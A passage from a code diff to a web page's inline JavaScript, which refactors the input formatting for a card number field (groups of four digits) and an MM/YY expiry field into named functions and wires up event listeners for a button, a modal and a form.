             for (let i = 0; i < value.length; i++) {
                 if (i > 0 && i % 4 === 0) {
                     formattedValue += ' ';
                 }
                 formattedValue += value[i];
             }
-            target.value = formattedValue.trim();
-        });
-        
-        // 4. Input Formatting (Expiry Date MM/YY)
-        expiryInput.addEventListener('input', function (e) {
-            let target = e.target;
-            let value = target.value.replace(/\D/g, ''); // Remove non-numeric
-            
+            e.target.value = formattedValue.trim();
+        }
+
+        // Function to auto-format expiry date with a slash
+        function formatExpiryDate(e) {
+            let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
             if (value.length > 2) {
-                target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
-            } else {
-                target.Value = value;
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
             }
-        });
+            e.target.value = value;
+        }
+
+        // Add event listeners
+        startButton.addEventListener('click', showModal);
+        testForm.addEventListener('submit', handleFormSubmit);
+        cardNumberInput.addEventListener('input', formatCardNumber);
+        expiryDateInput.addEventListener('input', formatExpiryDate);
 
     </script>
 </body>
